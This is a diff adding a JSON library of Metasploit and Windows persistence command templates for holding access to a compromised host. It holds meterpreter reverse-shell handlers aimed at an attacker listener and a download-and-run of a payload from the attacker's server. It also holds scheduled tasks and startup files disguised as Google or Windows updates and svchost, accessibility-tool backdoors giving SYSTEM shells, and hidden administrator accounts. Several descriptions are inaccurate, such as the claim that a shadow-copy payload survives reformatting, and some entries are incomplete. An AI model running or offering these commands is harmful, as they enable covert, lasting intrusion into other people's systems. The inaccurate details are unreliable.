@@ -1,0 +1,302 @@
+{
+  "title": "Metasploit - Persistence",
+  "commands": [
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "Registry Run key persistence (staged)",
+      "description": "Installs meterpreter to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run. Reconnects every 30s. Uses staged payload.",
+      "template": "use exploit/multi/handler\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST {lhost_ip}\nset LPORT {lport}\nset ExitOnSession false\nexploit -j"
+    },
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        },
+        {
+          "name": "interval",
+          "description": "Reconnect interval (seconds)",
+          "default": "30"
+        }
+      ],
+      "title": "Registry Run key persistence (via script)",
+      "description": "Old-style persistence script. Uses METERPRETER's built-in 'run persistence' for registry, startup folder, and service persistence.",
+      "template": "run persistence -X -i {interval} -p windows/x64/meterpreter_reverse_tcp -r {lhost_ip} -P {lport}"
+    },
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "Registry + Startup + Service persistence (multi-method)",
+      "description": "Installs persistence via RUN key, All Users Startup folder, and as a service. All three methods for redundancy.",
+      "template": "run persistence -S -U -X -i 30 -p windows/x64/meterpreter_reverse_tcp -r {lhost_ip} -P {lport}"
+    },
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "Windows service persistence (exploit module)",
+      "description": "Uses exploit/windows/local/persistence_service to install payload as a Windows service.",
+      "template": "run exploit/windows/local/persistence_service"
+    },
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "User-level persistence via S4U (s4u_persistence)",
+      "description": "Installs a persistent payload at the user level. Uses the s4u_persistence local exploit module.",
+      "template": "use exploit/windows/local/s4u_persistence\nset PAYLOAD windows/x64/meterpreter_reverse_tcp\nset LHOST {lhost_ip}\nset LPORT {lport}\nset SESSION 1\nexploit"
+    },
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "Volume Shadow Copy persistence (vss_persistence)",
+      "description": "Hides payload in a Volume Shadow Copy. Survives disk formatting and reinstallation. Very stealthy.",
+      "template": "use exploit/windows/local/vss_persistence\nset PAYLOAD windows/x64/meterpreter_reverse_tcp\nset LHOST {lhost_ip}\nset LPORT {lport}\nset SESSION 1\nexploit"
+    },
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "Manual schtasks persistence (daily at 9am)",
+      "description": "Creates a scheduled task that runs the payload daily at 9 AM using native schtasks.exe.",
+      "template": "shell schtasks /create /tn \"SecurityUpdate\" /tr \"C:\\Windows\\Temp\\payload.exe\" /sc daily /st 09:00 /f"
+    },
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "Manual schtasks persistence (on logon)",
+      "description": "Creates a scheduled task that runs whenever any user logs on.",
+      "template": "shell schtasks /create /tn \"Updater\" /tr \"C:\\Windows\\Temp\\payload.exe\" /sc onlogon /ru SYSTEM /f"
+    },
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "Manual schtasks persistence (every 5 min)",
+      "description": "Creates a scheduled task that runs every 5 minutes.",
+      "template": "shell schtasks /create /tn \"GoogleUpdate\" /tr \"C:\\Windows\\Temp\\payload.exe\" /sc minute /mo 5 /ru SYSTEM /f"
+    },
+    {
+      "args": [],
+      "title": "Sticky Keys backdoor (sethc.exe → cmd.exe)",
+      "description": "Replaces sethc.exe with cmd.exe. Press Shift 5 times at login to get SYSTEM shell.",
+      "template": "shell cmd /c copy /y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe"
+    },
+    {
+      "args": [],
+      "title": "Utilman backdoor (Utilman.exe → cmd.exe)",
+      "description": "Replaces Utilman.exe with cmd.exe. Press Win+U to get SYSTEM shell at login.",
+      "template": "shell cmd /c copy /y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe"
+    },
+    {
+      "args": [],
+      "title": "Narrator backdoor (Narrator.exe → cmd.exe)",
+      "description": "Replaces Narrator.exe with cmd.exe. Press Win+Ctrl+Enter to get SYSTEM shell at login.",
+      "template": "shell cmd /c copy /y C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\Narrator.exe"
+    },
+    {
+      "args": [],
+      "title": "IFEO persistence (Image File Execution Options)",
+      "description": "Sets cmd.exe as debugger for sethc.exe. When sethc runs (Shift x5 at login), cmd.exe opens as SYSTEM.",
+      "template": "shell reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v Debugger /t REG_SZ /d \"C:\\Windows\\System32\\cmd.exe\" /f"
+    },
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "Startup folder persistence (All Users)",
+      "description": "Places a shortcut or payload in the All Users Startup folder.",
+      "template": "shell copy C:\\Windows\\Temp\\payload.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\svchost.exe\""
+    },
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "WMI subscription persistence (Event Consumer)",
+      "description": "Creates a WMI event subscription that runs payload when system starts up. Stealthy — no file, no registry run key.",
+      "template": "shell wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name=\"UpdateFilter\", EventNameSpace=\"root\\cimv2\", QueryLanguage=\"WQL\", Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\""
+    },
+    {
+      "args": [],
+      "title": "Auto-migrate to a persistent process",
+      "description": "Migrates meterpreter to lsass.exe or explorer.exe so payload survives if current process is killed.",
+      "template": "run post/windows/manage/migrate"
+    },
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "Executable download + AutoRun persistence",
+      "description": "Downloads an exe from your web server and installs it in the startup folder in one command.",
+      "template": "run post/windows/manage/download_exec -r \"http://{lhost_ip}/payload.exe\" -o \"C:\\Users\\Public\\payload.exe\""
+    },
+    {
+      "args": [
+        {
+          "name": "lhost_ip",
+          "description": "Listener IP",
+          "default": "10.10.10.10"
+        },
+        {
+          "name": "lport",
+          "description": "Listener port",
+          "default": "4444"
+        }
+      ],
+      "title": "Install SSH server on target (persistent access)",
+      "description": "Installs and starts an SSH server on Windows for persistent remote access.",
+      "template": "run post/windows/manage/install_ssh"
+    },
+    {
+      "args": [
+        {
+          "name": "new_user",
+          "description": "Username to create",
+          "default": "helpdesk"
+        },
+        {
+          "name": "new_pass",
+          "description": "Password for new user",
+          "default": "P@ssw0rd!"
+        }
+      ],
+      "title": "Create a backdoor user account (local)",
+      "description": "Creates a local user and adds to Administrators group for persistent access.",
+      "template": "shell net user {new_user} {new_pass} /add && net localgroup Administrators {new_user} /add"
+    },
+    {
+      "args": [],
+      "title": "Create hidden backdoor user (Windows)",
+      "description": "Creates a hidden user account (name ends with $) that doesn't appear in login screen.",
+      "template": "shell net user hidden$ P@ssw0rd! /add && net localgroup Administrators hidden$ /add"
+    },
+    {
+      "args": [],
+      "title": "List all startup programs (registry)",
+      "description": "Enumerates programs set to run at startup from registry Run keys.",
+      "template": "shell reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+    },
+    {
+      "args": [],
+      "title": "List all scheduled tasks",
+      "description": "Enumerates scheduled tasks on the target system.",
+      "template": "shell schtasks /query /fo LIST /v"
+    },
+    {
+      "args": [],
+      "title": "List all running services",
+      "description": "Shows all services currently installed and running on the target.",
+      "template": "shell sc query"
+    }
+  ]
+}
